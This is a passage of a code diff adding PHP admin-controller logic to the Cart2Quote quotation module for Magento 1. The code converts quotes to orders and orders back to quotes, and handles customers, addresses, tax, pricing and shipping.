+            if ($customerAddresses['billingAddress'] != $customerAddresses['shippingAddress']) {
+                $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData('same_as_billing', 0);
+            } else {
+                $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData('same_as_billing', 1);
+            }
+
+            $this->_getOrderCreateModel()->getQuote()->setCustomerId($customerId);
+
+            //set customer group
+            $customerGroupId = (int)$_quoteadv->getCustomerGroupId();
+            $this->_getOrderCreateModel()->getQuote()->setCustomerGroupId($customerGroupId);
+
+            //set tax class id
+            $customerTaxClassId = (int)$_quoteadv->getData('customer_tax_class_id');
+            if($customerTaxClassId){
+                $this->_getOrderCreateModel()->getQuote()->setCustomerTaxClassId($customerTaxClassId);
+            }
+
+            // Apply Coupon Code
+            if ($_quoteadv->getData('salesrule') > 0) {
+                $this->_getOrderCreateModel()->applyCoupon(
+                    $_quoteadv->getCouponCodeById($_quoteadv->getData('salesrule'))
+                );
+            }
+
+            // Set Default Shipping Method
+            if ($_quoteadv->getAddress()->getShippingMethod() !== null && (int)$_quoteadv->getData('shipping_type')) {
+                $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData(
+                    'shipping_method',
+                    $_quoteadv->getAddress()->getData('shipping_method')
+                );
+                $this->_getOrderCreateModel()->getQuote()->getShippingAddress()->setData('collect_shipping_rates', '1');
+            }
+
+            if (count($requestedItems)) {
+                //convert quote items to order
+                Mage::helper('qquoteadv')->setCurrentCurrency($currencyCode);
+
+                $this->_convertQuoteItemsToOrder($quoteadvId, $requestedItems);
+                Mage::getSingleton('adminhtml/session')->setUpdateQuoteId($quoteadvId);
+            } else {
+                $msg = $this->__('To create an order, select product(s) and quantity');
+                Mage::getSingleton('adminhtml/session')->addError($msg);
+
+                if (isset($_SERVER['HTTP_REFERER'])) {
+                    $url = $_SERVER['HTTP_REFERER'];
+                    $this->_redirectUrl($url);
+                    return;
+                } else {
+                    $this->_redirect('*/*');
+                    return;
+                }
+            }
+
+            //add quoteadv id to the session for the quoteadv shipping option
+            Mage::getSingleton('core/session')->proposal_quote_id = $quoteadvId;
+
+            //add quoteadv id to the new order
+            $this->_getOrderCreateModel()->getQuote()->setProposalQuoteId($quoteadvId);
+
+            //set the selected shipping method on the sales_flat_quote item
+            try {
+                $quoteShippingCode = $_quoteadv->getShippingCode();
+                if (empty($quoteShippingCode)) {
+                    $quoteShippingCode = $_quoteadv->getShippingMethod();
+                }
+
+                if (isset($quoteShippingCode) && !empty($quoteShippingCode)) {
+                    $methods = Mage::getSingleton('shipping/config')->getActiveCarriers();
+                    foreach ($methods as $_ccode => $_carrier) {
+                        $_methods = $_carrier->getAllowedMethods();
+                        if ($_methods) {
+                            foreach ($_methods as $_mcode => $_method) {
+                                $_code = $_ccode . '_' . $_mcode;
+                                if ($_code == $quoteShippingCode) {
+                                    $this->_getOrderCreateModel()->setShippingMethod($quoteShippingCode);
+                                    $this->_getOrderCreateModel()->getShippingAddress()->requestShippingRates();
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (Exception $e) {
+                //in case the shipping method is disabled in the meantime, this could trow an error
+                Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+            }
+
+            //set payment
+            try {
+                $createFromId = $_quoteadv->getCreatedFromQuoteId();
+                if (isset($createFromId) && !empty($createFromId)) {
+                    $paymetData = Mage::getModel('sales/quote_payment')->getCollection()
+                        ->setQuoteFilter($createFromId)
+                        ->getFirstItem();
+
+                    if (isset($paymetData) && !empty($paymetData)) {
+                        $paymentDataArray = $paymetData->getData();
+                        if (!empty($paymentDataArray)) {
+                            $this->_getOrderCreateModel()->setPaymentData($paymentDataArray);
+                        }
+                    } else {
+                        $qPaymentMethod = $_quoteadv->getPaymentMethod();
+                        if (isset($qPaymentMethod) && !empty($qPaymentMethod)) {
+                            $this->_getOrderCreateModel()->setPaymentMethod($qPaymentMethod);
+                        }
+                    }
+                }
+            } catch (Exception $e) {
+                //in case the payment method is disabled in the meantime, this could trow an error
+                Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                $this->_getOrderCreateModel()->getQuote()->getPayment()->unsetData('method');
+                $this->_getOrderCreateModel()->getQuote()->removePayment();
+            }
+
+            //add redirect ID
+            $mageQuoteId = $this->_getOrderCreateModel()->getQuote()->getData('entity_id');
+            Mage::helper('qquoteadv')->setReferenceIdInCoreSession($mageQuoteId, $quoteadvId);
+
+            $this->_getOrderCreateModel()
+                ->initRuleData()
+                ->saveQuote();
+            $this->_getOrderCreateModel()->getSession()->setCurrencyId($currencyCode);
+            Mage::dispatchEvent(
+                'qquoteadv_qqadvcustomer_after_convert',
+                ['orderCreateModel' => $this->_getOrderCreateModel()]
+            );
+
+            Mage::helper('qquoteadv/logging')->sentAnonymousData('confirm', 'b', $quoteadvId);
+
+            $url = $this->getUrl('adminhtml/sales_order_create/index');
+            $this->_redirectUrl($url);
+
+            return;
+        } else {
+            $this->_redirect('*/*');
+        }
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_convert_after', [$quoteadvId, $requestedItems]);
+    }
+
+    /**
+     * Function that adds an error to the session and try's to redirect to a relevant page
+     *
+     * @param $errorMsg
+     * @param null $url
+     */
+    protected function _redirectErr($errorMsg, $url = null)
+    {
+        if (is_string($errorMsg)) {
+            $errorMsg = [$errorMsg];
+        }
+
+        if (count($errorMsg)) {
+            foreach ($errorMsg as $msg) {
+                Mage::getSingleton('adminhtml/session')->addError($msg);
+            }
+            if ($url == null) {
+                if(isset($_SERVER['HTTP_REFERER'])){
+                    $url = $_SERVER['HTTP_REFERER'];
+                }
+            }
+
+            if($url != null){
+                $this->_redirectUrl($url);
+            } else {
+                $this->_redirect('*/*');
+            }
+        }
+    }
+
+    /**
+     * Save customer
+     *
+     * @param \Mage_Sales_Model_Quote $quote
+     */
+    protected function _saveCustomerAfterQuote($quote)
+    {
+        $customer = $quote->getCustomer();
+        $store = $quote->getStore();
+        $billingAddress = $quote->getBillingAddress()->exportCustomerAddress()->getData();
+        if (!$quote->getCustomer()->getId()) {
+            $customer = Mage::getModel('qquoteadv/customer_customer');
+            $customer->setData($quote->getCustomer()->getData());
+            $customer->setPassword($customer->generatePassword());
+            $customer->setStore($store);
+            $customer->setEmail($quote->getData('customer_email'));
+            $customer->setGroupId($quote->getData('customer_group_id'));
+            $customer->setFirstname($billingAddress['firstname']);
+            $customer->setLastname($billingAddress['lastname']);
+            try {
+                Mage::dispatchEvent('qquoteadv_qqadvcustomer_before_newCustomer', ['customer' => $customer, 'quote' => $quote]);
+                $customer->save();
+                Mage::dispatchEvent('qquoteadv_qqadvcustomer_after_newCustomer', ['customer' => $customer, 'quote' => $quote]);
+                $customer->sendNewQuoteAccountEmail('registered', '', $customer->getStoreId());
+            } catch (Exception $e) {
+                $this->_redirectErr([$e->getMessage()]);
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                return;
+            }
+        }
+
+        // set customer to quote and convert customer data to quote
+        $quote->setCustomer($customer);
+    }
+
+    /**
+     * Alias for an old typo
+     */
+    public function switch2QuoteAction()
+    {
+        $this->swith2QuoteAction();
+    }
+
+    /**
+     * Function that switches an order to a quote
+     */
+    public function swith2QuoteAction()
+    {
+        //Check if free user
+        if (Mage::helper('qquoteadv/licensechecks')->showFreeUserOptions()) {
+            $this->_redirect('*/*');
+            return;
+        }
+
+        //unique id for c2q session
+        $c2qId = Mage::getSingleton('adminhtml/session')->getUpdateQuoteId(); //null;
+
+        //pool error messages
+        $errorMsg = [];
+
+        /**
+         * quote Data from session
+         * @var \Mage_Sales_Model_Quote $quote
+         */
+        $quote = Mage::getSingleton('adminhtml/session_quote')->getQuote();
+
+        //post data from input fields
+        $data = $this->getRequest()->getPost();
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_swith2Quote_before', [$c2qId, $quote, $data]);
+
+        //created from (magento) quote data
+        $createdFromQuote = Mage::getSingleton('adminhtml/session_quote');
+        $createdFromQuoteId = $createdFromQuote->getQuoteId();
+
+        $baseToQuoteRate = $quote->getData('base_to_quote_rate');
+        $currencyCode = $quote->getData('quote_currency_code');
+        $customerId = $quote->getCustomer()->getId();
+
+        if (!$customerId && $quote->getData('customer_email')) {
+            $this->_saveCustomerAfterQuote($quote);
+            $customerId = $quote->getCustomer()->getId();
+        }
+
+        $helperAddress = Mage::helper('qquoteadv/address');
+        $billingAddress = $quote->getBillingAddress();
+        $shipAddress = $quote->getShippingAddress();
+        $customerBillingAddressId = $quote->getBillingAddress()->getCustomerAddressId();
+        $saveBilling = $billingAddress->getData('save_in_address_book');
+        $customerShipAddressId = $quote->getShippingAddress()->getCustomerAddressId();
+        $saveShipping = $shipAddress->getData('save_in_address_book');
+        $shippingAsBilling = $data['shipping_as_billing'];
+
+        //Save or update customer billing address
+        if (($saveBilling == 1) && ($customerBillingAddressId == '0')) {
+            $customerAddress = $helperAddress->addCustomerAddress($customerId, $billingAddress->exportCustomerAddress()->getData());
+            $customerAddressId = $customerAddress->getEntityId();
+            if ($customerAddressId) {
+                $billingAddress->setCustomerAddressId($customerAddressId);
+                if ($shippingAsBilling == 1) {
+                    $shipAddress->setCustomerAddressId($customerAddressId);
+                }
+            }
+        } elseif ($customerBillingAddressId > 0 && $saveBilling == 1) {
+            $helperAddress->updateCustomerAddress($customerId, $customerBillingAddressId, $billingAddress->exportCustomerAddress()->getData());
+        }
+
+        //Save or update customer shipping address
+        if ($saveShipping == 1 && $customerShipAddressId == '0') {
+            $customerAddress = $helperAddress->addCustomerAddress($customerId, $shipAddress->exportCustomerAddress()->getData());
+            $customerAddressId = $customerAddress->getEntityId();
+            if ($customerAddressId) {
+                $shipAddress->setCustomerAddressId($customerAddressId);
+            }
+        } elseif ($customerShipAddressId > 0 && $saveShipping == 1) {
+            $helperAddress->updateCustomerAddress($customerId, $customerShipAddressId, $shipAddress->exportCustomerAddress()->getData());
+        }
+
+        if ($quote->getData('customer_email') != $quote->getCustomer()->getEmail()) {
+            try {
+                $email = $quote->getData('customer_email');
+                $customer = Mage::getModel('qquoteadv/customer_customer');
+                $customer->setData($quote->getCustomer()->getData());
+                $customer->setEmail($email);
+
+                Mage::dispatchEvent(
+                    'qquoteadv_qqadvcustomer_before_newCustomer',
+                    [
+                        'customer' => $customer,
+                        'quote' => $quote
+                    ]
+                );
+
+                $customer->save();
+
+                Mage::dispatchEvent(
+                    'qquoteadv_qqadvcustomer_after_newCustomer',
+                    [
+                        'customer' => $customer,
+                        'quote' => $quote
+                    ]
+                );
+
+                $customer->sendNewQuoteAccountEmail('registered', '', $customer->getStoreId());
+            } catch (Exception $e) {
+                $this->_redirectErr([$e->getMessage()]);
+                Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                return;
+            }
+        } else {
+            $email = $quote->getCustomer()->getEmail();
+        }
+
+        $items = $quote->getAllItems();
+
+        if (!Mage::getStoreConfig('qquoteadv_general/quotations/enabled', $quote->getStoreId())) {
+            $errorMsg[] = $this->__("Module Ophirah_Qquoteadv / Cart2Quote is disabled, please enable it in System>Configuration>Cart2Quote>General");
+        }
+
+        if (empty($customerId)) {
+            $errorMsg[] = $this->__("Customer not recognized for new quote");
+        } else {
+            if (!Mage::getStoreConfig('customer/account_share/scope',  $quote->getStoreId()) == 0) {
+                $currentModel = Mage::getModel('customer/customer')->load($customerId);
+                if ($currentModel) {
+                    $websiteId = $currentModel->getWebsiteId();
+                    $website = Mage::getModel('core/website')->load($websiteId);
+                    $storeIds = $website->getStoreIds();
+
+                    if(!in_array($quote->getStoreId(), $storeIds)) {
+                        $errorMsg[] = $this->__("The selected customer is not linked to the current store, Please set 'System>Configuration>Customers>Customer Configuration>Account Sharing Options>Share Customer Accounts' to global");
+                    }
+                }
+            }
+        }
+
+        if (empty($email)) {
+            $errorMsg[] = $this->__("Customer's email was undefined");
+        }
+
+        if (!count($items)) {
+            $errorMsg[] = $this->__("There was an error, because the product quantities were not defined");
+        }
+
+        foreach ($items as $item) {
+            // Simple child products from configurable
+            // needs to be checked with qty of the parent item
+            // Check if product is a configurable product
+            $checkConfigurable = Mage::helper('qquoteadv')->isConfigurable($item, $item->getData('qty'));
+            if ($checkConfigurable != false) {
+                $qty = $checkConfigurable;
+            } else {
+                $qty = $item->getData('qty');
+            }
+
+            // Bundled products need to be checked,
+            // including child products
+            if ($item->getData('product')->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE) {
+                $bundleOptions = Mage::getModel('qquoteadv/bundle')->getOrderOptions($item->getData('product'));
+                $itemChildren = Mage::getModel('qquoteadv/qqadvproduct')->getBundleOptionProducts($item->getData('product'), $bundleOptions['info_buyRequest']);
+            }
+
+            // Creating ChildProducts array
+            // in case product has a product type Bundle
+            // All childproducts need to be checked
+            $checkQty = $qty;
+            $checkProductArray = [];
+            // Parent product gets added first
+            $checkProductArray[] = $item->getData('product');
+            if (isset($itemChildren)) {
+                $checkProductArray = array_merge($checkProductArray, $itemChildren);
+            }
+
+            // Cycle through childproducts
+            foreach ($checkProductArray as $checkProduct) {
+                if ($checkProduct->getId() == $item->getData('product')->getId()) {
+                    if ($checkProduct->getQuoteItemQty()) {
+                        $checkQty = $checkProduct->getQuoteItemQty();
+
+                        if (is_array($checkQty)) {
+                            //bad way of getting the first value of the array
+                            foreach ($checkQty as $qtyValue) {
+                                $checkQty = $qtyValue;
+                                break;
+                            }
+                        }
+                    }
+
+                    $check = Mage::helper('qquoteadv')->isQuoteable($item->getData('product'), $checkQty);
+                }
+            }
+
+            if (isset($check) && $check->getHasErrors()) {
+                $errors = $check->getErrors();
+                $errorMsg = array_merge($errorMsg, $errors);
+            }
+        }
+
+        Mage::getSingleton('adminhtml/session')->setConfParent();
+
+        //#return back in case any error found
+        if (count($errorMsg)) {
+            $this->_redirectErr($errorMsg);
+            return;
+        }
+
+        //#c2q insert data
+        if ($customerId && $email) {
+            $modelCustomer = Mage::getModel('qquoteadv/qqadvcustomer');
+            $copyShippingParams = [
+                'shipping_amount' => 'shipping_amount',
+                'base_shipping_amount' => 'base_shipping_amount',
+                'shipping_amount_incl_tax' => 'shipping_amount_incl_tax',
+                'base_shipping_amount_incl_tax' => 'base_shipping_amount_incl_tax',
+                'base_shipping_tax_amount' => 'base_shipping_tax_amount',
+                'shipping_tax_amount' => 'shipping_tax_amount',
+                'address_shipping_method' => 'shipping_method',
+                'address_shipping_description' => 'shipping_description',
+            ];
+
+            $shipRates = $shipAddress->getShippingRatesCollection();
+
+            $copyRateParams = [];
+            $rate = null;
+            foreach ($shipRates as $rates) {
+                if ($rates['code'] == $shipAddress->getShippingMethod()) {
+                    $rate = $rates;
+                    $copyRateParams = [
+                        'shipping_method' => 'method',
+                        'shipping_description' => 'method_description',
+                        'shipping_method_title' => 'method_title',
+                        'shipping_carrier' => 'carrier',
+                        'shipping_carrier_title' => 'carrier_title',
+                        'shipping_code' => 'code'
+                    ];
+                    break;
+                }
+            }
+
+            $shipStreet = "";
+            $billStreet = "";
+            $shipAddressExists = false;
+            foreach ($shipAddress->getStreet() as $addressLine) {
+                if ($addressLine != "") {
+                    $shipAddressExists = true;
+                }
+            }
+
+            $billAddressExists = false;
+            foreach ($billingAddress->getStreet() as $addressLine) {
+                if ($addressLine != "") {
+                    $billAddressExists = true;
+                }
+            }
+
+            if ($shipAddressExists) {
+                $shipStreet = implode(PHP_EOL, $shipAddress->getStreet());
+            }
+
+            if ($billAddressExists) {
+                $billStreet = implode(PHP_EOL, $billingAddress->getStreet());
+            }
+
+            //Add customer Group
+            $customerGroup = $quote->getCustomer()->getData('group_id');
+            //If customer group is set in quote replace this with the default value.
+            if (array_key_exists('order', $data)) {
+                if (array_key_exists('account', $data['order'])) {
+                    if (array_key_exists('group_id', $data['order']['account'])) {
+                        $customerGroup = $data['order']['account']['group_id'];
+                    }
+                }
+            }
+
+            //add customer tax class id
+            $customerTaxClassId = Mage::getModel('customer/group')->getTaxClassId($customerGroup);
+
+            if (!$c2qId) {
+                $name = $billingAddress->getFirstname();
+                if ($name != "") { // &&  count($quote->getCustomer()->getAddresses()) ){
+                    /* @var Ophirah_Qquoteadv_Helper_Data $helper */
+                    $helper = Mage::helper('qquoteadv');
+
+                    /* @var Mage_Admin_Model_Session $admin */
+                    $admin = Mage::getSingleton('admin/session');
+
+                    $itemPrice = (Mage::getStoreConfig('qquoteadv_quote_configuration/proposal/itemprice') == 1) ? 1 : 0;
+                    $billAdrId = $billingAddress->getCustomerAddressId() > 0  ? $billingAddress->getCustomerAddressId() : null;
+                    $shipAdrId = $shipAddress->getCustomerAddressId() > 0 ? $shipAddress->getCustomerAddressId() : null;
+
+                    $quoteCustomer = [
+                        'created_at' => now(),
+                        'updated_at' => now(),
+
+                        'customer_id' => $customerId,
+                        'currency' => $currencyCode,
+                        'base_to_quote_rate' => $baseToQuoteRate,
+                        'prefix' => $billingAddress->getPrefix(),
+                        'firstname' => $billingAddress->getFirstname(),
+                        'middlename' => $billingAddress->getMiddlename(),
+                        'lastname' => $billingAddress->getLastname(),
+                        'suffix' => $billingAddress->getSuffix(),
+                        'company' => $billingAddress->getCompany(),
+                        'email' => $email,
+                        'country_id' => $billingAddress->getCountryId(),
+                        'region' => $billingAddress->getRegion(),
+                        'region_id' => $billingAddress->getRegionId(),
+                        'city' => $billingAddress->getCity(),
+                        'address' => $billStreet,
+                        'postcode' => $billingAddress->getPostcode(),
+                        'telephone' => $billingAddress->getTelephone(),
+                        'fax' => $billingAddress->getFax(),
+                        'store_id' => $quote->getStoreId(),
+                        'itemprice' => $itemPrice,
+                        'customer_address_id' => $billAdrId,
+
+                        'vat_id' => $billingAddress->getData('vat_id'),
+                        'vat_is_valid' => $billingAddress->getData('vat_is_valid'),
+                        'vat_request_id' => $billingAddress->getData('vat_request_id'),
+                        'vat_request_data' => $billingAddress->getData('vat_request_data'),
+                        'vat_request_success' => $billingAddress->getData('vat_request_success'),
+
+                        //#shipping
+                        'shipping_prefix' => $shipAddress->getData("prefix"),
+                        'shipping_firstname' => $shipAddress->getData("firstname"),
+                        'shipping_middlename' => $shipAddress->getData("middlename"),
+                        'shipping_lastname' => $shipAddress->getData("lastname"),
+                        'shipping_suffix' => $shipAddress->getData("suffix"),
+                        'shipping_company' => $shipAddress->getData("company"),
+                        'shipping_country_id' => $shipAddress->getData("country_id"),
+                        'shipping_region' => $shipAddress->getData("region"),
+                        'shipping_region_id' => $shipAddress->getData("region_id"),
+                        'shipping_city' => $shipAddress->getData("city"),
+                        'shipping_address' => $shipStreet,
+                        'shipping_postcode' => $shipAddress->getData("postcode"),
+                        'shipping_telephone' => $shipAddress->getData("telephone"),
+                        'shipping_fax' => $shipAddress->getData("fax"),
+
+                        'shipping_vat_id' => $shipAddress->getData('vat_id'),
+                        'shipping_vat_is_valid' => $shipAddress->getData('vat_is_valid'),
+                        'shipping_vat_request_id' => $shipAddress->getData('vat_request_id'),
+                        'shipping_vat_request_data' => $shipAddress->getData('vat_request_data'),
+                        'shipping_vat_request_success' => $shipAddress->getData('vat_request_success'),
+                        'shipping_customer_address_id' => $shipAdrId,
+
+                        'created_from_quote_id' => $createdFromQuoteId,
+                        'customer_group_id' => $customerGroup,
+                        'shipping_customer_group_id' => $customerGroup,
+                        'customer_tax_class_id' => $customerTaxClassId
+
+                    ];
+
+                    // Assigning SalesRep
+                    $modelCustomer->setData($quoteCustomer);
+                    $quoteCustomer['user_id'] = $helper->getExpectedQuoteAdminId($modelCustomer, $admin->getUserId(), true);
+
+                    foreach ($copyShippingParams as $key) {
+                        $quoteCustomer[$key] = $shipAddress->getData($key);
+                    }
+
+                    foreach ($copyRateParams as $key => $value) {
+                        $quoteCustomer[$key] = $rate[$value];
+                    }
+
+                    //#add customer to c2q
+                    try {
+                        $c2qId = $modelCustomer->addQuote($quoteCustomer)->getQuoteId();
+
+                        //#save c2q id into session
+                        $this->getCustomerSession()->setQuoteadvId($c2qId);
+                    } catch (Exception $e) {
+                        Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                    }
+                } else {
+                    $errorMsg[] = $this->__("There was an error, because the customer address was undefined");
+                }
+            } else {
+                //$c2qId is given
+                $this->getCustomerSession()->setQuoteadvId($c2qId);
+                $shipStreet = implode(PHP_EOL, $shipAddress->getStreet());
+                $billingStreet = implode(PHP_EOL, $billingAddress->getStreet());
+                $params = [];
+                $params['currency'] = $currencyCode;
+
+                $addressData = Mage::helper('qquoteadv/address')->addressFieldsArray();
+                foreach ($addressData as $key) {
+                    // Setting params to fix street/address naming issue
+                    if ($key != 'address') {
+                        $params[$key] = $billingAddress->getData($key);
+                        $params["shipping_" . $key] = $shipAddress->getData($key);
+                    }
+                }
+
+                foreach ($copyShippingParams as $key => $value) {
+                    $params[$key] = $shipAddress->getData($value);
+                }
+
+                foreach ($copyRateParams as $key => $value) {
+                    $params[$key] = $rate[$value];
+                }
+
+                // Setting params to fix street/address naming issue
+                $params['address'] = $billingStreet;
+                $params['shipping_address'] = $shipStreet;
+
+                $params['shipping_email'] = $email;
+                $params['email'] = $email;
+
+                //created_from_quote_id
+                $params['created_from_quote_id'] = $createdFromQuoteId;
+                $params['customer_group_id'] = $customerGroup;
+                $params['customer_tax_class_id'] = $customerTaxClassId;
+
+                if (count($params) > 0) {
+                    try {
+                        $modelCustomer = Mage::getModel('qquoteadv/qqadvcustomer')->updateQuote($c2qId, $params);
+                        $modelCustomer->updateAddress();
+                    } catch (Exception $e) {
+                        Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                    }
+                }
+            }
+
+            //#return back in case any error found
+            if (count($errorMsg)) {
+                $this->_redirectErr($errorMsg);
+                return;
+            }
+
+            //#parse in case quote has items
+            $quoteCollection = Mage::getModel('qquoteadv/qqadvproduct');
+            $quoteProductAdded = [];
+
+            //CHECK Compare order to quote to see what needs to be added or updated.
+            $handledRequestIds = [];
+            foreach ($quote->getAllVisibleItems() as $item) {
+                Mage::dispatchEvent(
+                    'ophirah_qquoteadv_admin_swith2Quote_additem_before',
+                    [
+                        'quote_item' => $item,
+                        'qqadvcustomer_id' => $c2qId
+                    ]
+                );
+
+                $product = $item->getProduct();
+
+                $taxStoreConfig = Mage::helper('tax')->priceIncludesTax($quote->getStoreId());
+
+                $quoteTax = 0;
+                $customerTax = 0;
+                $percent = 0;
+                $quoteCustomerTaxDifferent = false;
+                $itemBasePriceInclTax = $item->getBasePriceInclTax();
+                if ($taxStoreConfig) {
+                    /** @var Mage_Catalog_Model_Product $product */
+                    $product = Mage::getModel('catalog/product')
+                        ->setStoreId($quote->getStoreId())
+                        ->load($item->getProduct()->getId());
+
+                    /** @var \Mage_Tax_Model_Calculation $taxCalculation */
+                    $taxCalculation = Mage::getModel('tax/calculation');
+
+                    $customer = $quote->getCustomer();
+                    if ($customer) {
+                        $taxCalculation->setCustomer($customer);
+                    }
+
+                    $request = $taxCalculation->getRateOriginRequest($quote->getStore());
+
+                    //get tax percent
+                    $taxClassId = $product->getTaxClassId();
+                    $percent = $taxCalculation->getRate($request->setProductClassId($taxClassId));
+                    $quoteTax = $percent;
+
+                    //get user tax
+                    $customerTaxClass = null;
+                    if ($quote->getCustomerTaxClassId()) {
+                        $userRequest = $taxCalculation->getRateRequest(
+                            $quote->getShippingAddress(),
+                            $quote->getBillingAddress(),
+                            $quote->getCustomerTaxClassId(),
+                            $quote->getStore()
+                        );
+
+                        $percent = $taxCalculation->getRate($userRequest->setProductClassId($taxClassId));
+                        $customerTax = $percent;
+                    }
+
+                    if ($quoteTax != $customerTax) {
+                        $quoteCustomerTaxDifferent = true;
+                        $itemBasePriceInclTax = ($itemBasePriceInclTax / (100 + $customerTax)) * (100 + $quoteTax);
+                    }
+                }
+
+                if ($item->getProduct()->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE) {
+                    $original_price = Mage::getModel('bundle/product_price')->getFinalPrice(1, $item->getProduct());
+
+                    if ($taxStoreConfig) {
+                        $price = $itemBasePriceInclTax;
+                    } elseif ($item->getProduct()->getPriceType() == 0) {
+                        $price = $item->getPrice();
+                    } else {
+                        $price = $item->getBasePrice();
+                    }
+                } else {
+                    //no need to reload the product, it is already reloaded at #2746
+//                    $product = Mage::getModel('catalog/product')
+//                        ->setStoreId($quote->getStoreId())
+//                        ->load($item->getProduct()->getId());
+
+                    $price = $product->getPrice();
+
+                    if ($taxStoreConfig) {
+                        if (Mage::getStoreConfig('qquoteadv_advanced_settings/backend/force_original_product_price')) {
+                            $original_price = $price;
+                        } else {
+                            $original_price = $itemBasePriceInclTax;
+                        }
+                    } else {
+                        if (Mage::getStoreConfig('qquoteadv_advanced_settings/backend/force_original_product_price')) {
+                            $original_price = $price;
+                        } else {
+                            $original_price = $item->getBasePrice();
+                        }
+                    }
+                }
+
+                // Only Custom Prices needs to be recalculated by currency rate
+                if ($item->getOriginalCustomPrice()) {
+                    $customPrice = $item->getOriginalCustomPrice();
+                } else {
+                    if ($taxStoreConfig) {
+                        $customPrice = $itemBasePriceInclTax * $baseToQuoteRate;
+                    } elseif ($item->getProduct()->getTypeId() == Mage_Catalog_Model_Product_Type::TYPE_BUNDLE
+                        && $item->getProduct()->getPriceType() == 0) {
+                        $customPrice = $item->getPrice() * $baseToQuoteRate;
+                    } else {
+                        $customPrice = $item->getBasePrice() * $baseToQuoteRate;
+                    }
+
+                    $magentoPrecision = 2; //Yes, we round to 2, as Magento doesn't support more in their tax calculator
+                    $customPrice = round($customPrice, $magentoPrecision);
+                }
+
+                $basePrice = $customPrice / $baseToQuoteRate;
+                if (isset($customPrice) && !empty($customPrice)) {
+                    $price = $customPrice;
+                }
+                $orgPrice = $original_price;
+                $orgCurPrice = $orgPrice * $baseToQuoteRate;
+
+                if ($item->getBaseDiscountAmount() > 0) {
+                    $item->setNoDiscount(0);
+                    $useDiscount = 1;
+                } else {
+                    $item->setNoDiscount(1);
+                    $useDiscount = 0;
+                }
+
+                $qqadvproductId = $quoteCollection->getIdByQuoteAndProduct($item, $c2qId);
+                if ($qqadvproductId) {
+                    $qqadvproduct = Mage::getModel('qquoteadv/qqadvproduct')->load($qqadvproductId);
+                    Mage::dispatchEvent(
+                        'ophirah_qquoteadv_admin_swith2Quote_update_qqadvproduct_before',
+                        [
+                            'quote_item' => $item,
+                            'qqadvcustomer_id' => $c2qId,
+                            'qqadvproduct' => $qqadvproduct
+                        ]
+                    );
+
+                    //todo: check quoteadv_product_id? maybe in this case not.
+                    $request_items = Mage::getModel('qquoteadv/requestitem')->getCollection()
+                        ->addFieldToFilter('quote_id', $qqadvproduct->getQuoteId())
+                        ->addFieldToFilter('product_id', $qqadvproduct->getProductId())
+                        ->addFieldToFilter('request_qty', $qqadvproduct->getQty());
+
+                    //exclude items that are already handled
+                    foreach($handledRequestIds as $handledRequestId){
+                        $request_items->addFieldToFilter('request_id', ['neq' => $handledRequestId]);
+                    }
+
+                    $request_item = $request_items->getFirstItem();
+                    if ($request_item->getId()) {
+                        $handledRequestIds[] = $request_item->getId();
+                        $attribute = unserialize($qqadvproduct->getAttribute());
+
+                        $superAttribute = $item->getProduct()->getTypeInstance(true)->getOrderOptions($item->getProduct());
+                        if (isset($superAttribute['info_buyRequest'])) {
+                            if (isset($superAttribute['info_buyRequest']['super_attribute'])) {
+                                $attribute['super_attribute'] = $superAttribute['info_buyRequest']['super_attribute'];
+                            }
+                        }
+                        if (isset($superAttribute['options'])) {
+                            $qqadvproduct->setOptions(serialize($superAttribute['options']));
+                            $qqadvproduct->setHasOption(1);
+                        }
+
+                        $attribute['qty'] = $item->getQty();
+                        $qqadvproduct->setAttribute(serialize($attribute));
+                        $qqadvproduct->setQty($item->getQty());
+                        $qqadvproduct->setUseDiscount($useDiscount);
+
+                        try {
+                            Mage::dispatchEvent(
+                                'ophirah_qquoteadv_admin_swith2Quote_update_qqadvproduct_save_before',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct
+                                ]
+                            );
+
+                            $qqadvproduct->save();
+
+                            Mage::dispatchEvent(
+                                'ophirah_qquoteadv_admin_swith2Quote_update_qqadvproduct_save_after_success',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct
+                                ]
+                            );
+                        } catch (Exception $e) {
+                            Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                            Mage::dispatchEvent(
+                                'ophirah_qquoteadv_admin_swith2Quote_update_qqadvproduct_save_after_fail',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct,
+                                    'exception' => $e
+                                ]
+                            );
+                        }
+
+                        $request_item->setOwnerBasePrice($basePrice);
+                        $request_item->setOwnerCurPrice($price);
+                        $request_item->setOriginalPrice($orgPrice);
+                        $request_item->setOriginalCurPrice($orgCurPrice);
+                        $request_item->setRequestQty($item->getQty());
+                        try {
+                            Mage::dispatchEvent(
+                                'ophirah_qquoteadv_admin_swith2Quote_update_requestitem_save_before',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct
+                                ]
+                            );
+
+                            $request_item->save();
+
+                            Mage::dispatchEvent(
+                                'ophirah_qquoteadv_admin_swith2Quote_update_requestitem_save_after_success',
+                                [
+                                    'quote_item' => $item,
+                                    'qqadvcustomer_id' => $c2qId,
+                                    'qqadvproduct' => $qqadvproduct
+                                ]
+                            );
+                        } catch (Exception $e) {
+                            Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                            Mage::dispatchEvent(
